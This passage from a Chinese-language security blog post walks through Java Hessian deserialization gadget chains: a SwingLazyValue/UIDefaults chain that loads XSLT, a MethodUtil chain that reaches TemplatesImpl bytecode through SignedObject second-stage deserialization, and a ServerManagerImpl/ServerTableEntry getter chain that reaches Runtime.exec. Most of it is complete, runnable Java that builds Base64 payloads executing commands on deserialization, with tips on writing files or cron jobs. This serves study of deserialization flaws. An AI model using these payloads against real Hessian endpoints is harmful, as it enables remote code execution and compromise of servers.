        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        byteArrayOutputStream.write(67);
        Hessian2Output hessian2Output = new Hessian2Output(byteArrayOutputStream);
        hessian2Output.getSerializerFactory().setAllowNonSerializable(true);
        hessian2Output.writeObject(mtp);
        hessian2Output.close();
        System.out.println(new String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray())));

        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
        Hessian2Input hessianInput = new Hessian2Input(byteArrayInputStream);
        hessianInput.readObject();
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Class clazz = obj.getClass();
        while (clazz != null) {
            try {
                Field field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
                field.set(obj,value);
                clazz = null;
            } catch (Exception e) {
                clazz = clazz.getSuperclass();
            }
        }
    }
}
```

运行即可成功写入文件：

![image-20260718225558100](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260718225558100.png)

故这里如果可以的直接尝试写入定时任务什么的来直接打，但这里还是说一下组合拳。

###### 加载xslt文件

这里利用的是com.sun.org.apache.xalan.internal.xslt.Process类的`_main`方法，其中有个加载并编译xlst文件的操作：

![image-20260718225139207](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260718225139207.png)

如下构造即可：

```java
package hessian;

import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;
import java.lang.reflect.Field;
import sun.swing.SwingLazyValue;
import javax.activation.MimeTypeParameterList;
import javax.swing.*;

public class Main {
    public static void main(String[] args) throws Exception {
        SwingLazyValue lazyValue = new SwingLazyValue("com.sun.org.apache.xalan.internal.xslt.Process", "_main", new Object[]{new String[]{"-XT", "-XSL", "/tmp/evil.xslt"}});
        UIDefaults uiDefaults = new UIDefaults();
        uiDefaults.put("fupanc", lazyValue);

        MimeTypeParameterList mtp = new MimeTypeParameterList();
        setFieldValue(mtp,"parameters",uiDefaults);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        byteArrayOutputStream.write(67);
        Hessian2Output hessian2Output = new Hessian2Output(byteArrayOutputStream);
        hessian2Output.getSerializerFactory().setAllowNonSerializable(true);
        hessian2Output.writeObject(mtp);
        hessian2Output.close();
        System.out.println(new String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray())));

        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
        Hessian2Input hessianInput = new Hessian2Input(byteArrayInputStream);
        hessianInput.readObject();
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Class clazz = obj.getClass();
        while (clazz != null) {
            try {
                Field field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
                field.set(obj,value);
                clazz = null;
            } catch (Exception e) {
                clazz = clazz.getSuperclass();
            }
        }
    }
}
```

运行即可在反序列化时弹出计算机：

![image-20260718225708861](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260718225708861.png)

链子不是很难，自行跟进一下xslt部分的处理即可。

——————————————

##### MethodUtil链

来到关键的SwingLazyValue#createValue()方法：

![image-20260717161956207](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260717161956207.png)

这条链子后续是选择反射调用MethodUtil#invoke()方法：

![image-20260717162156401](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260717162156401.png)

一个static方法，跟进一下bounce变量：

![image-20260717162320573](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260717162320573.png)

其调用的getTrampoline()方法：

![image-20260717162354829](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260717162354829.png)

这里的getTrampolineClass()方法会获取到Trampoline类的Class对象，对应获取到其invoke()方法：

![image-20260717162637817](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260717162637817.png)

故这里的MethodUtil#invoke()方法其实就是反射调用Trampoline#invoke()方法，也就是可以调用任意类的任意方法。故可以如下构造代码：

```java
package hessian;

import com.alibaba.fastjson.JSONObject;
import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.Base64;
import java.lang.reflect.Field;
import java.security.Signature;
import java.security.SignedObject;
import java.security.KeyPairGenerator;
import java.security.KeyPair;
import java.util.HashMap;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import sun.reflect.misc.MethodUtil;
import sun.swing.SwingLazyValue;
import javax.management.BadAttributeValueExpException;
import javax.swing.*;

public class Main {
    public static void main(String[] args) throws Exception {
        
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = classPool.makeClass("Evil");
        String cmd= "java.lang.Runtime.getRuntime().exec(\\\\"open -a Calculator\\\\");";
        cc.makeClassInitializer().insertBefore(cmd);
        cc.setSuperclass(classPool.get(AbstractTranslet.class.getName()));
        byte[] classBytes = cc.toBytecode();
        byte[][] code = new byte[][]{classBytes};

        TemplatesImpl tem = new TemplatesImpl();
        setFieldValue(tem, "_name", "fupanc");
        setFieldValue(tem, "_bytecodes", code);
        setFieldValue(tem, "_class", null);

        
        JSONObject jsonObject = new JSONObject();
        jsonObject.put("fupanc",tem);
        BadAttributeValueExpException bad = new BadAttributeValueExpException(null);
        setFieldValue(bad, "val", jsonObject);

        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
        kpg.initialize(1024);
        KeyPair kp = kpg.generateKeyPair();
        SignedObject signedObject = new SignedObject(bad,kp.getPrivate(),Signature.getInstance("DSA"));

        Method method = signedObject.getClass().getDeclaredMethod("getObject");

        Method mt = MethodUtil.class.getDeclaredMethod("invoke",Method.class, Object.class, Object[].class);

        SwingLazyValue lazyValue = new SwingLazyValue("sun.reflect.misc.MethodUtil","invoke",new Object[]{mt,new Object(),new Object[]{method,signedObject,new Object[0]}});

        UIDefaults uiDefaults0 = new UIDefaults();
        uiDefaults0.put("fupanc", lazyValue);

        UIDefaults uiDefaults1 = new UIDefaults();
        uiDefaults1.put("fupanc", lazyValue);

        HashMap map2 = makeMap(uiDefaults0, uiDefaults1);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        Hessian2Output hessian2Output = new Hessian2Output(byteArrayOutputStream);
        hessian2Output.getSerializerFactory().setAllowNonSerializable(true);
        hessian2Output.writeObject(map2);
        hessian2Output.close();
        System.out.println(new String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray())));

        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
        Hessian2Input hessianInput = new Hessian2Input(byteArrayInputStream);
        hessianInput.readObject();
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Class clazz = obj.getClass();
        while (clazz != null) {
            try {
                Field field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
                field.set(obj,value);
                clazz = null;
            } catch (Exception e) {
                clazz = clazz.getSuperclass();
            }
        }
    }

    public static HashMap<Object, Object> makeMap (Object v1, Object v2 ) throws Exception {
        HashMap<Object, Object> s = new HashMap<>();
        setFieldValue(s, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, "1", null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, "2", null));
        setFieldValue(s, "table", tbl);
        return s;
    }
}
```

**我这里是构造的调用SignedObject类的getObject()方法打二次反序列化**，运行即可在反序列化时弹出计算机：

![image-20260718204740366](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260718204740366.png)

**这里有两个点要说明一下，第一个**是起始点的选型本来是想通过HashMap的父类AbstractMap#equals()方法来触发UIDefaults#get()方法：

![image-20260718205048221](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260718205048221.png)

这样的话就需要控制HashMap中第一个放入的键值对为UIDefaults类实例：

![image-20260718205154474](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260718205154474.png)

也就是说这里的选型为HashMap和UIDefaults类，这样的话就需要控制hash值相同，看了一下UIDefaults类的hash计算，会进入到其父类的hashCode()方法：

![image-20260718205437207](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260718205437207.png)

就能知道要控制HashMap和UIDefaults类的hash值相同是很难的，所以这里最好是控制为要放入的两个键值对的键都是UIDefaults类。然后看了一下UIDefaults的equals()方法，同样会进入Hashtable的equals()方法：

![image-20260718205856336](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260718205856336.png)

和HashMap的父类AbstractMap的equals()方法基本一样，所以直接控制两个键都是UIDefaults类即可，同时为了保证链子的进行，分别放入了两个同样的键值对以便hash值计算相同。

**第二个是链子的构造**，这里其实调用了两次MethodUtil#invoke()方法，代码重点就是：

```java
Method method = signedObject.getClass().getDeclaredMethod("getObject");

        Method mt = MethodUtil.class.getDeclaredMethod("invoke",Method.class, Object.class, Object[].class);

        SwingLazyValue lazyValue = new SwingLazyValue("sun.reflect.misc.MethodUtil","invoke",new Object[]{mt,new Object(),new Object[]{method,signedObject,new Object[0]}});
```

主要还是因为SwingLazyValue#createValue()方法：

![image-20260718210457907](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260718210457907.png)

可以看到这里在获取method和最终调用时都是使用的`this.args`变量，跟进关键的getClassArray()方法：

![image-20260718211523844](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260718211523844.png)

很容易看出是通过getClass()方法获取对应Class对象。然后因为是MethodUtil#invoke()方法的参数类型是Method.class, Object.class, Object\[\].class，所以这里传的SwingLazyValue的arg变量的第二个参数必须是new Object()实例化对象，这样才能成功获取到MethodUtil的invoke()方法，但这样当链子进行到后面时情况就是如下的：

![image-20260718212713082](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260718212713082.png)

**这里的var1肯定是Object类实例**，除非**打一个静态方法**，否则不可能可以直接反射调用一个类的方法，所以这里控制相关参数再次打了一下MethodUtil#invoke()方法，重点就是这里的var2参数，再次进行了一下反射调用方法：

![image-20260718213134965](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260718213134965.png)

最后成功实现了反射调用任意类的任意方法，调通链子后理解一下目的即可，设计得还是挺不错的。

————————————

简单分析了两条jdk利用链，在后续的调用任意类的静态方法，还有很多利用点，结合spring的原生依赖又有很多链子能打，可以参考0CTF2022-hessian-onlyjdk题解以及java-chains上的链子，这里就不多说了。

### getter链

在前面我们想直接打命令执行一般都是打的TemplatesImpl类的getter方法，但因为hessian序列化特性，都需要加一个二次反序列化来实现。**但是因为hessian序列化和反序列化不会检查对应类是否实现Serializable接口，jdk原生类中有一条可以直接通过一个getter方法打命令执行的链子**。下面来分析一下，调用栈如下：

```php
exec:348, Runtime (java.lang)
activate:202, ServerTableEntry (com.sun.corba.se.impl.activation)
isValid:370, ServerTableEntry (com.sun.corba.se.impl.activation)
getActiveServers:266, ServerManagerImpl (com.sun.corba.se.impl.activation)
```

可以看到是调用了ServerManagerImpl类的getActiveServers()方法，进而调用了ServerTableEntry类的isValid()方法，再调用ServerTableEntry类的activate()方法继而调用到了Runtime类的exec()方法，先跟进sink点：

![image-20251103011341329](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20251103011341329.png)

这里的activationCmd变量就是一个String类型的：

![image-20251103011512138](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20251103011512138.png)

很容易控制。

现在来简单看看这里的链子，跟进ServerManagerImpl类的getActiveServers()方法：

![image-20251103011817108](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20251103011817108.png)

可以看到如图调用了关键的isValid()方法，并从中可以看到比较关键的就是serverTable变量，跟进看变量的定义：

![image-20251103024102962](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20251103024102962.png)

那么后续就很好理解了，就是迭代serverTable中的键值对，然后对值进行一些判断。由此可容易看出我们需要放入一个值为ServerTableEntry的键值对。

再跟进ServerTableEntry类的isValid()方法：

![image-20251103024431589](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20251103024431589.png)

需要构造变量来调用到activate()方法，先看一下这里涉及到的几个变量：

![image-20251103024613387](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20251103024613387.png)

![image-20251103024647485](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20251103024647485.png)

故这里我们只需要控制state等于2即可，随后就可以调用到activate()方法从而进行任意命令执行：

![image-20251103024821566](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20251103024821566.png)

很简洁明了的链子，这里结合fastjson打一下，最终代码如下：

```java
package hessian;

import com.alibaba.fastjson.JSONObject;
import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Constructor;
import java.util.Base64;
import java.lang.reflect.Field;
import java.util.HashMap;
import com.sun.corba.se.impl.activation.ServerManagerImpl;
import com.sun.corba.se.impl.activation.ServerTableEntry;
import sun.reflect.ReflectionFactory;

public class Main {
    public static void main(String[] args) throws Exception {
        ServerManagerImpl serverManager = (ServerManagerImpl)getObject(Class.forName("com.sun.corba.se.impl.activation.ServerManagerImpl"));

        ServerTableEntry entry = (ServerTableEntry)getObject(Class.forName("com.sun.corba.se.impl.activation.ServerTableEntry"));
        Process process = new ProcessBuilder("true").start();
        setFieldValue(entry, "state", 2);
        setFieldValue(entry, "activationCmd", "open -a Calculator");
        setFieldValue(entry, "process", process);

        HashMap hashMap = new HashMap(256);
        hashMap.put(1, entry);

        setFieldValue(serverManager, "serverTable", hashMap);

        JSONObject jsonObject1 = new JSONObject();
        jsonObject1.put("fupanc1",serverManager);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        byteArrayOutputStream.write(67);
        Hessian2Output hessian2Output = new Hessian2Output(byteArrayOutputStream);
        hessian2Output.getSerializerFactory().setAllowNonSerializable(true);
        hessian2Output.writeObject(jsonObject1);
        hessian2Output.close();
        System.out.println(new String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray())));

        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
        Hessian2Input hessianInput = new Hessian2Input(byteArrayInputStream);
        hessianInput.readObject();
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Class clazz = obj.getClass();
        while (clazz != null) {
            try {
                Field field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
                field.set(obj,value);
                clazz = null;
            } catch (Exception e) {
                clazz = clazz.getSuperclass();
            }
        }
    }

    public static Object getObject(Class clazz) throws Exception{
        ReflectionFactory reflectionFactory = ReflectionFactory.getReflectionFactory();
        Constructor constructor = reflectionFactory.newConstructorForSerialization(clazz,Object.class.getDeclaredConstructor());
        constructor.setAccessible(true);
        return constructor.newInstance();
    }
}
```

运行即可在反序列化时弹出计算机：

![image-20260717211134078](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260717211134078.png)

大体是不难的，但是在构造过程中踩了两个坑，这里分别说明一下。

**第一个**是在ServerManagerImpl#getActiveServers()方法：

![image-20260717211346753](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260717211346753.png)

这里会迭代serverTable变量中的key并且在获取时会类型转换为Integer，也就是键需要为一个int类型的，原本我是设置成了字符串类型的fupanc，当反序列化调用到这里时会因为强制类型转换报错退出，故我在这里将代码中hashmap中放入的键值对的键改成了数字1。

**第二个**是在ServerTableEntry#isValid()方法：

![image-20260717211623976](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260717211623976.png)

原本构造链子的时候没有注意到这个process变量，导致在hessian反序列化时这个变量的值为null，从而导致这里在对这个变量调用exitValue()方法时直接报错退出了，故我们需要在hessian序列化前给一个变量赋值。这个变量的定义：

![image-20260717212128822](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20260717212128822.png)

Process类型的，并且后面还是调用的exitValue()来获取已结束进程的退出码，故这里就直接像我前面设置的那样：

```java
Process process = new ProcessBuilder("true").start();
setFieldValue(entry, "process", process);
```

给process变量加上执行的结果就行。另外注意这里不同系统生成的链子不能打，比如windows和类unix系统不同，ProcessBuilder#start()的底层执行代码也就不一样，执行结束的Process也就不一样，所以不能直接用mac生成的payload去打windows环境，否则反序列化时会报错。注意一下就行。

这条getter链在hessian反序列化中可以多用，一方面是不需要出网即可直接打，另一方面相比TemplatesImpl打动态加载字节码的链子长度肯定是偏短的。

————————————

参考文章：

[](https://www.notion.so/8263f6e97254463a938a18e9c2ebdde0?pvs=21)[https://nivi4.notion.site/Hessian-8263f6e97254463a938a18e9c2ebdde0#786ce2b58aff4ed1b1c088da3e210a3e](https://nivi4.notion.site/Hessian-8263f6e97254463a938a18e9c2ebdde0#786ce2b58aff4ed1b1c088da3e210a3e)

[https://su18.org/post/hessian/#groovy](https://su18.org/post/hessian/#groovy)

[https://forum.butian.net/share/2592](https://forum.butian.net/share/2592)
